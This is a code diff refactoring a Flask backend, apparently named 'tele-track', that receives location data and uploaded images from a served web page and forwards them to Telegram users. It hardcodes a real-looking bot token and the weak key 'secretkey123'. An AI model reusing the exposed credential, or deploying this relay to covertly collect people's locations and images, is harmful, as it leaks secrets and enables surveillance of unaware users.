@@ -14,7 +14,7 @@ import requests
 # -------------------- Config --------------------
 TELEGRAM_BOT_TOKEN = "8068204110:AAELqo2Dres3tX5pvlC5O2wopyqFwaP2AM0"
 AUTHORIZED_KEY = "secretkey123"
-WEBHOOK_URL = "https://tele-track-syk8.onrender.com/webhook"  # Replace with your actual Render URL
+WEBHOOK_URL = "https://tele-track-syk8.onrender.com/webhook"  # Replace if different
 
 SAVE_FOLDER = "saved_files"
 os.makedirs(SAVE_FOLDER, exist_ok=True)
@@ -49,26 +49,17 @@ def init_db():
 
 init_db()
 
-# -------------------- Telegram Functions --------------------
+# -------------------- Telegram Utils --------------------
 def send_telegram_message(message):
     for user_id in authenticated_users:
-        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-        data = {
-            "chat_id": user_id,
-            "text": message,
-            "parse_mode": "Markdown"
-        }
-        requests.post(url, data=data)
+        bot.send_message(chat_id=user_id, text=message, parse_mode="Markdown")
 
 def send_telegram_image(image_path, caption=""):
     for user_id in authenticated_users:
-        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
         with open(image_path, "rb") as photo:
-            files = {"photo": photo}
-            data = {"chat_id": user_id, "caption": caption}
-            requests.post(url, files=files, data=data)
+            bot.send_photo(chat_id=user_id, photo=photo, caption=caption)
 
-# -------------------- Telegram Command Handlers --------------------
+# -------------------- Command Handlers --------------------
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if user_id not in authenticated_users:
@@ -111,22 +102,27 @@ async def delete(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     await update.message.reply_text(f"🗑️ Deleted {deleted_files} image(s) and cleared database.")
 
-# Register Handlers
+# Register handlers
 application.add_handler(CommandHandler("start", start))
 application.add_handler(CommandHandler("auth", auth))
 application.add_handler(CommandHandler("chatid", chatid))
 application.add_handler(CommandHandler("delete", delete))
 
-# -------------------- Flask Routes --------------------
-@app.route('/')
-def index():
-    return send_file('index.html')
-
+# -------------------- Webhook Route --------------------
 @app.route('/webhook', methods=['POST'])
 def webhook():
-    update = Update.de_json(request.get_json(force=True), bot)
-    asyncio.run(application.process_update(update))
+    try:
+        data = request.get_json(force=True)
+        update = Update.from_dict(data)
+        asyncio.run(application.process_update(update))
+    except Exception as e:
+        print("Webhook error:", e)
     return "OK"
+
+# -------------------- Other Routes --------------------
+@app.route('/')
+def index():
+    return send_file('index.html')  # Or change to static/index.html if needed
 
 @app.route('/location', methods=['POST'])
 def receive_location():
@@ -183,13 +179,15 @@ def upload_image():
     send_telegram_image(filename, caption="🖼️ New Image Uploaded")
     return jsonify({"status": "OK"}), 200
 
-# -------------------- Start Server --------------------
+# -------------------- Main --------------------
 if __name__ == '__main__':
-    # Set webhook when server starts
-    response = requests.get(
-        f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/setWebhook?url={WEBHOOK_URL}"
+    # Set webhook
+    resp = requests.get(
+        f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/setWebhook",
+        params={"url": WEBHOOK_URL}
     )
-    print("🔗 Webhook Set:", response.json())
+    print("📡 Set Webhook:", resp.json())
 
-    print("🚀 Starting Flask server...")
-    app.run(host="0.0.0.0", port=5000)
+    # Start Flask server
+    print("🚀 Starting server on Render...")
+    app.run(host='0.0.0.0', port=5000)
